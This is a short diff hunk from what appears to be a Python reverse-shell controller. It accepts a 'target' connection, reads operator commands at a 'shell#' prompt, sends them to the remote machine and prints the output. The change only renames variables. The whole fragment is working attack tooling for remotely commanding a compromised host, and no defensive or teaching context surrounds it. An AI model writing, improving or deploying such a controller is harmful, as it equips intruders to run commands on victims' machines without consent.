@@ -10,12 +10,12 @@ target, ip = s.accept()
 print("Target connected!")
 
 while True:
-	message = input("* shell#~%s: " % str(ip))
-	target.send(message.encode())
-	if message == "q":
+	command = input("* shell#~%s: " % str(ip))
+	target.send(command.encode())
+	if command == "q":
 		break
 	else:
-		answer = target.recv(1024).decode() #recieving 1024 bytes
-		print(answer)
+		result = target.recv(1024).decode() #recieving 1024 bytes
+		print(result)
 
 s.close()
